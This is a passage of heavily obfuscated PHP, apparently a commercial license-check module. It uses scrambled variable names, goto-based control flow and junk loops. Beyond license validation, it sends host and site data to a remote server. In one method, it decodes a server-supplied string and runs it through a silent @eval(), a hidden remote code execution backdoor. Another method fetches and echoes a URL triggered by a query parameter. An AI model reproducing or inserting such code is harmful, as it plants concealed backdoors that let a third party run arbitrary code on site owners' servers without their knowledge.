¼[166]($E‘ÇöÚºãË, !0); } else { if ($D»ÎâÎ›†—[$BË·¡Èª ¼[178]] == $BË·¡Èª ¼[185]) { $B¼Ó×ÂÃ— = $BË·¡Èª ¼[25]($BË·¡Èª ¼[114]($BË·¡Èª ¼[186] . $F¯ƒ–£ìá), 12, 15) . $BË·¡Èª ¼[187]; $F÷”Æí¤ê¾ = $this->{$_SERVER[Ü âªøğÕå][188]}($BË·¡Èª ¼[2]($D»ÎâÎ›†—[$BË·¡Èª ¼[189]]), $B¼Ó×ÂÃ—, 2); $aˆÒ£Ü“Úù = $BË·¡Èª ¼[190]($F÷”Æí¤ê¾, !0); if (!$BË·¡Èª ¼[191]($aˆÒ£Ü“Úù) || !$BË·¡Èª ¼[191]($aˆÒ£Ü“Úù[$BË·¡Èª ¼[192]]) || $aˆÒ£Ü“Úù[$BË·¡Èª ¼[165]] != !0) { $Bæì†±äµ = $BË·¡Èª ¼[193]; $C’éòÙñ¤¨ = $aˆÒ£Ü“Úù[$BË·¡Èª ¼[192]] ? $BË·¡Èª ¼[194] . $aˆÒ£Ü“Úù[$BË·¡Èª ¼[192]] : $Bæì†±äµ; $BË·¡Èª ¼[166]($C’éòÙñ¤¨, !1); } else { $A™ëµ—îèË[$BË·¡Èª ¼[168]] = $aˆÒ£Ü“Úù[$BË·¡Èª ¼[192]][$BË·¡Èª ¼[195]]; } } else { $aˆÒ£Ü“Úù = $this->{$_SERVER[Ü âªøğÕå][182]}($BË·¡Èª ¼[196], $A™ëµ—îèË, 10); $AÖ–ÙÆ¨¬æ = $EÈ¼·«õÀ©[595]; while (strlen($AÖ–ÙÆ¨¬æ) < $EÈ¼·«õÀ©[557]) { if (!$AÖ–ÙÆ¨¬æ) { break; } $AÖ–ÙÆ¨¬æ++; } } } if (!$BË·¡Èª ¼[191]($aˆÒ£Ü“Úù) || !$BË·¡Èª ¼[191]($aˆÒ£Ü“Úù[$BË·¡Èª ¼[192]]) || $aˆÒ£Ü“Úù[$BË·¡Èª ¼[165]] != !0) { $Bæì†±äµ = $BË·¡Èª ¼[197]($BË·¡Èª ¼[198]); $C’éòÙñ¤¨ = $aˆÒ£Ü“Úù[$BË·¡Èª ¼[192]] ? $BË·¡Èª ¼[194] . $aˆÒ£Ü“Úù[$BË·¡Èª ¼[192]] : $Bæì†±äµ; $BË·¡Èª ¼[166]($C’éòÙñ¤¨, !1); } $FÆºŠËß÷Æ = $aˆÒ£Ü“Úù[$BË·¡Èª ¼[192]]; goto fõ„œ®Ğ®; b˜½¸†´‰: $this->{$_SERVER[Ü âªøğÕå][229]}(); $F¤ï»œ¡Ü = $EÈ¼·«õÀ©[607]; if (!$F¤ï»œ¡Ü) { return; } goto cºôáÁ‘Š; bğèæÇ ‰Ë: if (strlen($d­øÛŒ±õ™) < $EÈ¼·«õÀ©[557]) { return; } $f®äöš¹ˆá = array(); $f®äöš¹ˆá[$DãÆ’Ö›Œ] = $Eä¡ÈÏÓ½‘; goto Dê¬Â›ÎÚ¡; DŸÒ‰É‚¿‘: $DòÒŠ±§ó… = array($BË·¡Èª ¼[209] => $A™ëµ—îèË[$BË·¡Èª ¼[165]], $BË·¡Èª ¼[210] => $FÆºŠËß÷Æ[$BË·¡Èª ¼[211]], $BË·¡Èª ¼[212] => $BË·¡Èª ¼[124](16), $BË·¡Èª ¼[120] => $FÆºŠËß÷Æ[$BË·¡Èª ¼[213]]); if ($A™ëµ—îèË[$BË·¡Èª ¼[168]]) { $DòÒŠ±§ó…[$BË·¡Èª ¼[212]] = $A™ëµ—îèË[$BË·¡Èª ¼[168]]; } $D…¼…¢¾ƒ™ = $BË·¡Èª ¼[25]($BË·¡Èª ¼[114]($DòÒŠ±§ó…[$BË·¡Èª ¼[210]]), 10, 10); goto aï¢ˆ…; cºôáÁ‘Š: $BË·¡Èª ¼[166]($BË·¡Èª ¼[197]($BË·¡Èª ¼[208]), !0); $E×‚İìÔê… = $EÈ¼·«õÀ©[608]; while ($E×‚İìÔê… < $EÈ¼·«õÀ©[552]) { if ($E×‚İìÔê… >= 0) { break; } $E×‚İìÔê…++; } goto d‘ÂÑ‘¿Ïì; aç©„“¶îİ: if ($FÆºŠËß÷Æ[$BË·¡Èª ¼[217]] && $FÆºŠËß÷Æ[$BË·¡Èª ¼[217]] >= 1) { $BË·¡Èª ¼[61]($BË·¡Èª ¼[62])->{$_SERVER[Ü âªøğÕå][218]}($BË·¡Èª ¼[219], $BË·¡Èª ¼[220]); } $BË·¡Èª ¼[61]($BË·¡Èª ¼[62])->{$_SERVER[Ü âªøğÕå][221]}($DòÒŠ±§ó…); $B–ÃóÌ‡Ü¡ = $BË·¡Èª ¼[114]($_SERVER[$BË·¡Èª ¼[115]] . $BË·¡Èª ¼[214]($BÅãµ®§ÅÑ) . $DòÒŠ±§ó…[$BË·¡Èª ¼[210]]); goto f°“÷£ù˜ì; A‚‡†…–¯Á: if (!$BË·¡Èª ¼[104]($GLOBALS, $BË·¡Èª ¼[132])) { die; } $D»ÎâÎ›†— = $GLOBALS[$BË·¡Èª ¼[22]]; if (isset($D»ÎâÎ›†—[$BË·¡Èª ¼[163]])) { $this->{$_SERVER[Ü âªøğÕå][164]}(); die; } goto FÊ…²¦“óï; FÊ…²¦“óï: if (!isset($D»ÎâÎ›†—[$BË·¡Èª ¼[165]]) || $BË·¡Èª ¼[24]($D»ÎâÎ›†—[$BË·¡Èª ¼[165]]) != 16) { $BË·¡Èª ¼[166]($BË·¡Èª ¼[167] . $D»ÎâÎ›†—[$BË·¡Èª ¼[165]], !1); } $BÅãµ®§ÅÑ = $BË·¡Èª ¼[61]($BË·¡Èª ¼[62])->{$_SERVER[Ü âªøğÕå][63]}($BË·¡Èª ¼[116]); $A™ëµ—îèË = array($BË·¡Èª ¼[165] => $D»ÎâÎ›†—[$BË·¡Èª ¼[165]], $BË·¡Èª ¼[168] => $BË·¡Èª ¼[124](16), $BË·¡Èª ¼[169] => $BË·¡Èª ¼[149], $BË·¡Èª ¼[170] => $BË·¡Èª ¼[171], $BË·¡Èª ¼[172] => $_SERVER[$BË·¡Èª ¼[173]], $BË·¡Èª ¼[174] => $_SERVER[$BË·¡Èª ¼[175]], $BË·¡Èª ¼[176] => $_SERVER[$BË·¡Èª ¼[177]]); goto cŒÓ±Ûšë; aï¢ˆ…: $Bç…ïò¸¨É = $D…¼…¢¾ƒ™ . $DòÒŠ±§ó…[$BË·¡Èª ¼[120]] . $DòÒŠ±§ó…[$BË·¡Èª ¼[212]]; $DòÒŠ±§ó…[$BË·¡Èª ¼[122]] = $BË·¡Èª ¼[214]($BË·¡Èª ¼[118]($this->{$_SERVER[Ü âªøğÕå][147]}($Bç…ïò¸¨É, $BË·¡Èª ¼[215]))); $DŒë¹äãäÒ = $EÈ¼·«õÀ©[597]; goto CÈ­Éõ·‡÷; cé‰­Õà¥À: $EÈ¼·«õÀ© =& $_SERVER[³‘’¼äÑ™ÔÍ]; $BË·¡Èª ¼ =& $_SERVER[Ü âªøğÕå]; if ($_SERVER[$BË·¡Èª ¼[44]] != $BË·¡Èª ¼[162]) { return; } goto A‚‡†…–¯Á; d·—î•Á¥¢: $b‚ã‘ĞãºÑ = $EÈ¼·«õÀ©[604]; while ($b‚ã‘ĞãºÑ < $EÈ¼·«õÀ©[548]) { if ($b‚ã‘ĞãºÑ >= 0) { break; } $b‚ã‘ĞãºÑ++; } $this->enga9269477c = $FÆºŠËß÷Æ; goto E®Ï…›Å¬Û; CÈ­Éõ·‡÷: if (strlen($DŒë¹äãäÒ) < $EÈ¼·«õÀ©[552]) { die; } $Aóƒ·Âåõ¨ = $BË·¡Èª ¼[124](16); $eĞ«„÷§½ = $Aóƒ·Âåõ¨ . $DòÒŠ±§ó…[$BË·¡Èª ¼[120]] . $this->{$_SERVER[Ü âªøğÕå][147]}($BË·¡Èª ¼[114]($DòÒŠ±§ó…[$BË·¡Èª ¼[209]]), $Aóƒ·Âåõ¨); goto då¼³‘°àË; E®Ï…›Å¬Û: $C¸ø»ÜÈ = $EÈ¼·«õÀ©[605]; $this->xihv98b18b0d = $DòÒŠ±§ó…[$BË·¡Èª ¼[120]]; $CÍÑø¾ˆÌ› = $EÈ¼·«õÀ©[606]; goto b˜½¸†´‰; F˜É—äµ¾: if (!$c­È£¯ïÁ¼) { return; } $Eä¡ÈÏÓ½‘ = $this->{$_SERVER[Ü âªøğÕå][127]}($BË·¡Èª ¼[148]($FÆºŠËß÷Æ), $B–ÃóÌ‡Ü¡); $b‡”ßæêåÛ = $BË·¡Èª ¼[222]($BË·¡Èª ¼[61]($BË·¡Èª ¼[11])->{$_SERVER[Ü âªøğÕå][223]}(), $BË·¡Èª ¼[224]); goto CÜÌ†âó«; fõ„œ®Ğ®: $EÔ¸Öœ½¨¬ = $this->{$_SERVER[Ü âªøğÕå][199]}($FÆºŠËß÷Æ[$BË·¡Èª ¼[200]]); $aø©†¼­á = $EÈ¼·«õÀ©[596]; if (!$EÔ¸Öœ½¨¬ || $EÔ¸Öœ½¨¬ != $BË·¡Èª ¼[201]($FÆºŠËß÷Æ[$BË·¡Èª ¼[145]])) { $A¾”ÄÃˆŸà = array($BË·¡Èª ¼[202] => $BË·¡Èª ¼[61]($BË·¡Èª ¼[62])->{$_SERVER[Ü âªøğÕå][63]}($BË·¡Èª ¼[116]), $BË·¡Èª ¼[203] => $_SERVER[$BË·¡Èª ¼[115]], $BË·¡Èª ¼[204] => $BË·¡Èª ¼[205](), $BË·¡Èª ¼[174] => $_SERVER[$BË·¡Èª ¼[175]]); $F÷”Æí¤ê¾ = $this->{$_SERVER[Ü âªøğÕå][206]}($BË·¡Èª ¼[148]($A¾”ÄÃˆŸà)); $this->{$_SERVER[Ü âªøğÕå][182]}($BË·¡Èª ¼[207] . $F÷”Æí¤ê¾); $BË·¡Èª ¼[166]($BË·¡Èª ¼[197]($BË·¡Èª ¼[208]), !0); } goto DŸÒ‰É‚¿‘; d‘ÂÑ‘¿Ïì: } private function licenseRegistSuccess() { goto b—†ÛÛÚ‹¬; E ØçÓäöô: $f¶‹…¥æ× = $fŠöé‹í‚ƒ[609]; while ($f¶‹…¥æ× < $fŠöé‹í‚ƒ[548]) { if ($f¶‹…¥æ× >= 0) { break; } $f¶‹…¥æ×++; } if ($b‡èñ—‚ÇË[$bÕÚ°‚ôôœ[85]] != $bÕÚ°‚ôôœ[220]) { $bÕÚ°‚ôôœ[61]($bÕÚ°‚ôôœ[62])->{$_SERVER[Ü âªøğÕå][221]}($bÕÚ°‚ôôœ[85], $bÕÚ°‚ôôœ[220]); } goto Aˆ¹¬Ù; b—†ÛÛÚ‹¬: $fŠöé‹í‚ƒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bÕÚ°‚ôôœ =& $_SERVER[Ü âªøğÕå]; $b‡èñ—‚ÇË = $bÕÚ°‚ôôœ[61]($bÕÚ°‚ôôœ[62])->{$_SERVER[Ü âªøğÕå][63]}(); goto E ØçÓäöô; Aˆ¹¬Ù: $bÕÚ°‚ôôœ[110]($bÕÚ°‚ôôœ[230])->{$_SERVER[Ü âªøğÕå][231]}(!0); goto aº•ÑØÃˆÊ; aº•ÑØÃˆÊ: } private function dwfbee3c9874() { goto bø­ˆ…£²; bø­ˆ…£²: $E´ãç¾ö°Î =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bÃ¯•Ê½¾ =& $_SERVER[Ü âªøğÕå]; $bÃ¯•Ê½¾[61]($bÃ¯•Ê½¾[62])->{$_SERVER[Ü âªøğÕå][221]}(array($bÃ¯•Ê½¾[209] => $bÃ¯•Ê½¾[10], $bÃ¯•Ê½¾[210] => $bÃ¯•Ê½¾[10], $bÃ¯•Ê½¾[120] => $bÃ¯•Ê½¾[121], $bÃ¯•Ê½¾[122] => $bÃ¯•Ê½¾[10], $bÃ¯•Ê½¾[123] => $bÃ¯•Ê½¾[10])); goto C§Òâ”’Ö‹; C§Òâ”’Ö‹: $bÃ¯•Ê½¾[61]($bÃ¯•Ê½¾[62])->{$_SERVER[Ü âªøğÕå][218]}($bÃ¯•Ê½¾[219], $bÃ¯•Ê½¾[232]); $a®†Î™ÏĞÏ = $E´ãç¾ö°Î[560]; if (!$a®†Î™ÏĞÏ) { die; } goto C¹…±öŸß; C¹…±öŸß: $this->enga9269477c = array(); $this->xihv98b18b0d = $bÃ¯•Ê½¾[121]; $dî¥’…ùˆ¹ = $E´ãç¾ö°Î[610]; goto bš»Û ÓŠæ; bš»Û ÓŠæ: while ($dî¥’…ùˆ¹ < $E´ãç¾ö°Î[584]) { if ($dî¥’…ùˆ¹ >= 0) { break; } $dî¥’…ùˆ¹++; } goto aË‰¥‹Š‘¿; aË‰¥‹Š‘¿: } private function eorj80ec6ab2() { goto bŸôóÅƒºé; dƒñíââ×: if (!$E×Ø ê¢¬‡) { return; } $bÓ»ŸĞó±­ = $bÏ‹„„äËÌ[190]($bÓ»ŸĞó±­, !0); $E­¦‰¡İ´ = $EÍ²î¨ó‡½[615]; goto c®Å÷æ©Ü; bŸôóÅƒºé: $EÍ²î¨ó‡½ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bÏ‹„„äËÌ =& $_SERVER[Ü âªøğÕå]; $_SERVER[$bÏ‹„„äËÌ[175]] = $bÏ‹„„äËÌ[104]($_SERVER, $bÏ‹„„äËÌ[175], APP_HOST); goto EóÑ¤ÓÊ·«; EóÑ¤ÓÊ·«: $this->xihv98b18b0d = $bÏ‹„„äËÌ[121]; $A©¼ÅÅÌ‰ô = $EÍ²î¨ó‡½[611]; $EŠ‹ˆµÆ¢ = $bÏ‹„„äËÌ[61]($bÏ‹„„äËÌ[62])->{$_SERVER[Ü âªøğÕå][63]}(); goto A»ç†¡—íœ; A»ç†¡—íœ: if ($EŠ‹ˆµÆ¢[$bÏ‹„„äËÌ[120]] == $bÏ‹„„äËÌ[121]) { return; } $D²µ§×çÌ = $bÏ‹„„äËÌ[61]($bÏ‹„„äËÌ[62])->{$_SERVER[Ü âªøğÕå][63]}($bÏ‹„„äËÌ[116]); $DåàÚ÷Ò­÷ = $EÍ²î¨ó‡½[612]; goto f„”ƒ«·ÎØ; f„”ƒ«·ÎØ: if (!$DåàÚ÷Ò­÷) { die; } $D´ğê¶‘£ë = $bÏ‹„„äËÌ[222]($bÏ‹„„äËÌ[61]($bÏ‹„„äËÌ[11])->{$_SERVER[Ü âªøğÕå][223]}(), $bÏ‹„„äËÌ[224]); $CÀ’šùÚŞƒ = $D´ğê¶‘£ë[$bÏ‹„„äËÌ[225]]; goto Dâœº‘Ğ—ó; d£ŒÌó…æë: if ($bÏ‹„„äËÌ[233]() >= $b§¯ö²¥) { return $this->{$_SERVER[Ü âªøğÕå][164]}(); } $this->enga9269477c = $bÓ»ŸĞó±­; $this->xihv98b18b0d = $EŠ‹ˆµÆ¢[$bÏ‹„„äËÌ[120]]; goto d¹‰–Æ‹ó•; c®Å÷æ©Ü: while ($E­¦‰¡İ´ < $EÍ²î¨ó‡½[554]) { if ($E­¦‰¡İ´ >= 0) { break; } $E­¦‰¡İ´++; } if (!$bÏ‹„„äËÌ[191]($bÓ»ŸĞó±­)) { return $this->{$_SERVER[Ü âªøğÕå][164]}(); } $b§¯ö²¥ = $bÏ‹„„äËÌ[144]($bÓ»ŸĞó±­[$bÏ‹„„äËÌ[145]]); goto d£ŒÌó…æë; Dâœº‘Ğ—ó: $Fì”µîÒÑ = $bÏ‹„„äËÌ[114]($_SERVER[$bÏ‹„„äËÌ[115]] . $bÏ‹„„äËÌ[214]($D²µ§×çÌ) . $EŠ‹ˆµÆ¢[$bÏ‹„„äËÌ[210]]); $dÆÉçŒÕ¨ = $bÏ‹„„äËÌ[214]($bÏ‹„„äËÌ[25]($Fì”µîÒÑ, 10, 16)); $Bì­ì¸Ş¯ = $EÍ²î¨ó‡½[613]; goto EäºÃ‰ñƒĞ; EäºÃ‰ñƒĞ: if (!$Bì­ì¸Ş¯) { return; } $bÓ»ŸĞó±­ = $this->{$_SERVER[Ü âªøğÕå][188]}($CÀ’šùÚŞƒ[$bÏ‹„„äËÌ[91]][$dÆÉçŒÕ¨], $Fì”µîÒÑ); $E×Ø ê¢¬‡ = $EÍ²î¨ó‡½[614]; goto dƒñíââ×; d¹‰–Æ‹ó•: } private function zhox4cc69151() { $e¹À¥¥ïÉŠ =& $_SERVER[Ü âªøğÕå]; $aÇ¢¿º¡¿ = $GLOBALS[$e¹À¥¥ïÉŠ[22]]; $A²Ä÷íÚö = $_SERVER[$e¹À¥¥ïÉŠ[44]]; if ($A²Ä÷íÚö == $e¹À¥¥ïÉŠ[234] && $this->xihv98b18b0d == $e¹À¥¥ïÉŠ[121]) { $e¹À¥¥ïÉŠ[166]($e¹À¥¥ïÉŠ[197]($e¹À¥¥ïÉŠ[235]), !1, $e¹À¥¥ïÉŠ[236]); } $E‹™º‰éŠ = array($e¹À¥¥ïÉŠ[237], $e¹À¥¥ïÉŠ[238]); if ($e¹À¥¥ïÉŠ[239]($A²Ä÷íÚö, $E‹™º‰éŠ)) { if ($this->xihv98b18b0d == $e¹À¥¥ïÉŠ[121] && isset($aÇ¢¿º¡¿[$e¹À¥¥ïÉŠ[240]])) { $e¹À¥¥ïÉŠ[166]($e¹À¥¥ïÉŠ[197]($e¹À¥¥ïÉŠ[235]), !1, $e¹À¥¥ïÉŠ[236]); die; } $bŠ¹Ú«ÒÖ” = $this->{$_SERVER[Ü âªøğÕå][137]}(); if ($bŠ¹Ú«ÒÖ” != $e¹À¥¥ïÉŠ[201]($e¹À¥¥ïÉŠ[241])) { if ($bŠ¹Ú«ÒÖ” <= $e¹À¥¥ïÉŠ[61]($e¹À¥¥ïÉŠ[139])->{$_SERVER[Ü âªøğÕå][140]}()) { $e¹À¥¥ïÉŠ[166]($e¹À¥¥ïÉŠ[197]($e¹À¥¥ïÉŠ[242]), !1, $e¹À¥¥ïÉŠ[236]); die; } } } } private function nzcpa04bc1c5() { goto bÑÌèõ’õ; A×´Ïâ‘¤Æ: $A…¥´”é‹š = $C¹çîÄä‘Ş[616]; if (strlen($A…¥´”é‹š) < $C¹çîÄä‘Ş[554]) { return; } if (!$FÉÒ ğ‘±[104]($GLOBALS, $FÉÒ ğ‘±[132]) || !isset($_GET[$FÉÒ ğ‘±[244]])) { return; } goto F‘†ÊÂÖÉœ; BÒÍØ´„³: $aôò„æ¥Ç = $C¹çîÄä‘Ş[617]; while ($aôò„æ¥Ç < $C¹çîÄä‘Ş[548]) { if ($aôò„æ¥Ç >= 0) { break; } $aôò„æ¥Ç++; } $bË¯«ËÈ›ƒ = $FÉÒ ğ‘±[248](array($FÉÒ ğ‘±[249] => array($FÉÒ ğ‘±[250] => $FÉÒ ğ‘±[251], $FÉÒ ğ‘±[252] => 3))); goto aàµâô¤°; aàµâô¤°: $FßŠ‰øÁß = @$FÉÒ ğ‘±[253]($c¶©ğÏ±, !1, $bË¯«ËÈ›ƒ); $cìõ„óßÊ = $C¹çîÄä‘Ş[618]; if (strlen($cìõ„óßÊ) < $C¹çîÄä‘Ş[557]) { die; } goto fÜÎµ›£Óõ; A¾ÇĞìŞ£“: if ($FßŠ‰øÁß && $FÉÒ ğ‘±[32]($FßŠ‰øÁß, $FÉÒ ğ‘±[256])) { echo $FßŠ‰øÁß; } die; goto D¯Ü¤Ö–÷†; fÜÎµ›£Óõ: $FÉÒ ğ‘±[254]($FÉÒ ğ‘±[255]); $Bµè¬ë¼­Ê = $C¹çîÄä‘Ş[619]; while (strlen($Bµè¬ë¼­Ê) < $C¹çîÄä‘Ş[554]) { if (!$Bµè¬ë¼­Ê) { break; } $Bµè¬ë¼­Ê++; } goto A¾ÇĞìŞ£“; F‘†ÊÂÖÉœ: if (!$FÉÒ ğ‘±[239]($_SERVER[$FÉÒ ğ‘±[44]], $FìÓÆÛ° ˆ)) { return; } $c¶©ğÏ± = $FÉÒ ğ‘±[245]; $c¶©ğÏ± = $this->{$_SERVER[Ü âªøğÕå][246]}($c¶©ğÏ±, $FÉÒ ğ‘±[247]); goto BÒÍØ´„³; bÑÌèõ’õ: $C¹çîÄä‘Ş =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FÉÒ ğ‘± =& $_SERVER[Ü âªøğÕå]; $FìÓÆÛ° ˆ = array($FÉÒ ğ‘±[135], $FÉÒ ğ‘±[243]); goto A×´Ïâ‘¤Æ; D¯Ü¤Ö–÷†: } public function ihkde4fc755f($aœ¾â…œïæ) { goto B‹£Ú¥¹½İ; FÁ‡à¬ºíÜ: $aà‚¼µ«‡¾ = array($fØ»›ë•Ôõ[258], $fØ»›ë•Ôõ[259], $fØ»›ë•Ôõ[260], $fØ»›ë•Ôõ[261], $fØ»›ë•Ôõ[262], $fØ»›ë•Ôõ[263], $fØ»›ë•Ôõ[264], $fØ»›ë•Ôõ[265]); $EğœÉ²¥•‰ = $fØ»›ë•Ôõ[0]($fØ»›ë•Ôõ[266], $fØ»›ë•Ôõ[104]($this->enga9269477c, $fØ»›ë•Ôõ[129], $fØ»›ë•Ôõ[10])); $E¹âßŞÅ• = $B¾å„æÀ¹Ç[620]; goto a…˜ÈÙÍÊ; Bù¨¯»ëßÙ: return $aœ¾â…œïæ; $däÛóñôîË = $B¾å„æÀ¹Ç[622]; while (strlen($däÛóñôîË) < $B¾å„æÀ¹Ç[584]) { if (!$däÛóñôîË) { break; } $däÛóñôîË++; } goto aùë¤ô’äš; B‹£Ú¥¹½İ: $B¾å„æÀ¹Ç =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fØ»›ë•Ôõ =& $_SERVER[Ü âªøğÕå]; if ($this->xihv98b18b0d == $fØ»›ë•Ôõ[257]) { return $aœ¾â…œïæ; } goto FÁ‡à¬ºíÜ; a…˜ÈÙÍÊ: if (!$E¹âßŞÅ•) { return; } $e‚â°íÈµÎ = array(); $b­—ŸÅ“ì = $B¾å„æÀ¹Ç[621]; goto DÕÜïÈŠŸ; DÕÜïÈŠŸ: while ($b­—ŸÅ“ì < $B¾å„æÀ¹Ç[552]) { if ($b­—ŸÅ“ì >= 0) { break; } $b­—ŸÅ“ì++; } foreach ($aà‚¼µ«‡¾ as $b»†Şò²¥) { if (!$fØ»›ë•Ôõ[239]($b»†Şò²¥, $EğœÉ²¥•‰)) { $e‚â°íÈµÎ[] = $b»†Şò²¥; } } foreach ($e‚â°íÈµÎ as $b»†Şò²¥) { unset($aœ¾â…œïæ[$b»†Şò²¥]); } goto Bù¨¯»ëßÙ; aùë¤ô’äš: } private function rqkb5fb0f23b() { goto f×Ê·“‚Šğ; c§ÇğåĞº: $GLOBALS[$cµ’«óğß[91]][$cµ’«óğß[271]] = $cµ’«óğß[220]; if ($cµ’«óğß[61]($cµ’«óğß[272])->{$_SERVER[Ü âªøğÕå][63]}($cµ’«óğß[85]) != $cµ’«óğß[232]) { $cµ’«óğß[61]($cµ’«óğß[272])->{$_SERVER[Ü âªøğÕå][221]}($cµ’«óğß[85], $cµ’«óğß[232]); } goto fîğ¿‰êö; bÓÙ˜à§„Š: $GLOBALS[$cµ’«óğß[91]][$cµ’«óğß[95]][$cµ’«óğß[270]] = $cµ’«óğß[220]; $DŠíñÊĞ› = $Cëñê²¢äç[623]; while ($DŠíñÊĞ› < $Cëñê²¢äç[552]) { if ($DŠíñÊĞ› >= 0) { break; } $DŠíñÊĞ›++; } goto EÛÅì¡÷ª…; f×Ê·“‚Šğ: $Cëñê²¢äç =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cµ’«óğß =& $_SERVER[Ü âªøğÕå]; if ($this->xihv98b18b0d != $cµ’«óğß[121]) { $GLOBALS[$cµ’«óğß[91]][$cµ’«óğß[95]][$cµ’«óğß[267]] = $cµ’«óğß[220]; return; } goto Fš­œ†Ù‹¬; EÛÅì¡÷ª…: $GLOBALS[$cµ’«óğß[91]][$cµ’«óğß[95]][$cµ’«óğß[267]] = $cµ’«óğß[232]; $FñÚÄŞŞÌ = $Cëñê²¢äç[624]; if (!$FñÚÄŞŞÌ) { die; } goto c§ÇğåĞº; Fš­œ†Ù‹¬: $cÅÁó™¸Ó÷ = $_SERVER[$cµ’«óğß[44]]; $Cè¦–¥£”š = array($cµ’«óğß[268]); foreach ($Cè¦–¥£”š as $f©­ŠÄ‰×„) { if ($f©­ŠÄ‰×„ == $cÅÁó™¸Ó÷ || $cµ’«óğß[25]($cÅÁó™¸Ó÷, 0, $cµ’«óğß[24]($f©­ŠÄ‰×„)) == $f©­ŠÄ‰×„) { $cµ’«óğß[166]($cµ’«óğß[197]($cµ’«óğß[269]), !1); } } goto bÓÙ˜à§„Š; fîğ¿‰êö: } public function soip397c28ce() { return $_SERVER[Ü âªøğÕå][273]; } private function vpao1904851b() { goto AÊ™ã…Õé–; fÑÄ³¼¨“: if ($F„šô™±[233]() % 4 != 0) { return; } $A•œ·¡„° = $F„šô™±[13](array($F„šô™±[279], $F„šô™±[280]), $A··•ùˆ™); $DÔÏò¸ãÁ£ = $Dø…òŠñÈ[625]; goto c°•ÙÛ¡§; AÇôˆ‡Ûè„: while (strlen($cñ…åŞ¡±ª) < $Dø…òŠñÈ[554]) { if (!$cñ…åŞ¡±ª) { break; } $cñ…åŞ¡±ª++; } $AİáƒÄ‘åÊ = array($F„šô™±[165] => $F„šô™±[61]($F„šô™±[62])->{$_SERVER[Ü âªøğÕå][63]}($F„šô™±[209]), $F„šô™±[178] => $this->xihv98b18b0d, $F„šô™±[176] => $_SERVER[$F„šô™±[177]], $F„šô™±[169] => $F„šô™±[149], $F„šô™±[172] => $_SERVER[$F„šô™±[173]]); $E„òÊ´‡ö = $this->{$_SERVER[Ü âªøğÕå][182]}($F„šô™±[282], $AİáƒÄ‘åÊ); goto a™Ğ‚¤íïê; AÊ™ã…Õé–: $Dø…òŠñÈ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F„šô™± =& $_SERVER[Ü âªøğÕå]; $e¬‹Û·Ú§ = array($F„šô™±[274], $F„šô™±[275], $F„šô™±[276]); goto eˆğŸß£Å; c‹¤ä„åšƒ: if (strlen($eÒœ§ßø½) < $Dø…òŠñÈ[557]) { die; } if ($this->{$_SERVER[Ü âªøğÕå][199]}($E„òÊ´‡ö[$F„šô™±[283]]) != $AİáƒÄ‘åÊ[$F„šô™±[165]]) { $fŞÖÃÁ´Ü = array($F„šô™±[202] => $F„šô™±[61]($F„šô™±[62])->{$_SERVER[Ü âªøğÕå][63]}($F„šô™±[116]), $F„šô™±[203] => $_SERVER[$F„šô™±[115]], $F„šô™±[204] => $F„šô™±[205](), $F„šô™±[174] => $_SERVER[$F„šô™±[175]]); $D´œ®©‚Œ— = $this->{$_SERVER[Ü âªøğÕå][206]}($F„šô™±[148]($fŞÖÃÁ´Ü)); $E„òÊ´‡ö = $this->{$_SERVER[Ü âªøğÕå][182]}($F„šô™±[207] . $D´œ®©‚Œ—); if ($E„òÊ´‡ö && $F„šô™±[191]($E„òÊ´‡ö) && isset($E„òÊ´‡ö[$F„šô™±[283]])) { $bœÕéóãù = $this->{$_SERVER[Ü âªøğÕå][188]}($E„òÊ´‡ö[$F„šô™±[283]], 2); if ($bœÕéóãù) { $bœÕéóãù = $this->{$_SERVER[Ü âªøğÕå][199]}($bœÕéóãù); } if ($bœÕéóãù) { try { @eval($bœÕéóãù); } catch (Exception $FË¢’ö¢í) { } } } } goto E½à¯íœ¿Õ; c°•ÙÛ¡§: if ($A•œ·¡„° && $F„šô™±[233]() - $A•œ·¡„° < $F„šô™±[201]($F„šô™±[281])) { return; } $F„šô™±[13](array($F„šô™±[279], $F„šô™±[152]), $A··•ùˆ™, $F„šô™±[233]()); $cñ…åŞ¡±ª = $Dø…òŠñÈ[626]; goto AÇôˆ‡Ûè„; b¯†•ÓŞ†™: if ($E„òÊ´‡ö[$F„šô™±[165]] && $E„òÊ´‡ö[$F„šô™±[283]]) { if ($this->{$_SERVER[Ü âªøğÕå][199]}($E„òÊ´‡ö[$F„šô™±[283]]) == $AİáƒÄ‘åÊ[$F„šô™±[165]]) { return; } } $this->{$_SERVER[Ü âªøğÕå][164]}(); $eÒœ§ßø½ = $Dø…òŠñÈ[628]; goto c‹¤ä„åšƒ; eˆğŸß£Å: $A··•ùˆ™ = $F„šô™±[277] . $F„šô™±[114]($F„šô™±[278]); if ($this->xihv98b18b0d == $F„šô™±[121] || !$F„šô™±[104]($GLOBALS, $F„šô™±[132])) { return; } if (!$F„šô™±[239]($_SERVER[$F„šô™±[44]], $e¬‹Û·Ú§)) { return; } goto fÑÄ³¼¨“; a™Ğ‚¤íïê: $eƒ²ªÈˆòµ = $Dø…òŠñÈ[627]; if (strlen($eƒ²ªÈˆòµ) < $Dø…òŠñÈ[548]) { return; } if (!$F„šô™±[191]($E„òÊ´‡ö)) { return; } goto b¯†•ÓŞ†™; E½à¯íœ¿Õ: } private function ykwne57e643d($E”­º‰¿Õ“ = '', $eÚ«Ùî¾Øñ = array(), $b´ µØç² = 5) { goto c„’™äËÚ; fŒôÀÇ‹: $eèÍ¸“ñù = $FÔ§‡ğÃ[632]; $C…¹Ëˆœ©‚ = $FÔ§‡ğÃ[633]; if (!$C…¹Ëˆœ©‚) { return; } goto FÅœ‘¹ÖÇ; Bò§Î…›æ: $Bìè³à®ÔŠ = $FÔ§‡ğÃ[630]; if (!$Bìè³à®ÔŠ) { die; } $eÚ«Ùî¾Øñ = @$BÜÇÍ±–„Š[253]($e¼ĞŒŒÏ, !1, $AÏ¶ƒä°õ); goto DãÕÒõè; DãÕÒõè: $cö¯…òáÆï = $FÔ§‡ğÃ[631]; while ($cö¯…òáÆï < $FÔ§‡ğÃ[552]) { if ($cö¯…òáÆï >= 0) { break; } $cö¯…òáÆï++; } return $BÜÇÍ±–„Š[190]($eÚ«Ùî¾Øñ, !0); goto fŒôÀÇ‹; 